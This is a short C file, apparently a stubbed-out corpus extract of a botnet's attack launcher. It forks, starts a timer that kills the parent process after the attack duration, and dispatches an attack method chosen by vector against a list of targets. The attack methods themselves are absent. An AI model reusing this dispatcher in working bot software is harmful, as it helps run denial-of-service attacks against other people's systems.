#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  uint8_t ;
struct attack_target {int dummy; } ;
struct attack_option {int dummy; } ;
struct TYPE_2__ {scalar_t__ vector; int /*<<< orphan*/  (* func ) (int /*<<< orphan*/ ,struct attack_target*,int /*<<< orphan*/ ,struct attack_option*) ;} ;
typedef  scalar_t__ ATTACK_VECTOR ;

/* Variables and functions */
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ ) ; 
 int FUNC1 () ; 
 int /*<<< orphan*/  FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ,int) ; 
 TYPE_1__** methods ; 
 int methods_len ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ,struct attack_target*,int /*<<< orphan*/ ,struct attack_option*) ; 

void FUNC7(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int pid1, pid2;

    pid1 = FUNC1();
    if (pid1 == -1 || pid1 > 0)
        return;

    pid2 = FUNC1();
    if (pid2 == -1)
        FUNC0(0);
    else if (pid2 == 0)
    {
        FUNC5(duration);
        FUNC3(FUNC2(), 9);
        FUNC0(0);
    }
    else
    {
        int i;

        for (i = 0; i < methods_len; i++)
        {
            if (methods[i]->vector == vector)
            {
#ifdef DEBUG
                printf("[attack] Starting attack...\n");
#endif
                methods[i]->func(targs_len, targs, opts_len, opts);
                break;
            }
        }

        //just bail if the function returns
        FUNC0(0);
    }
}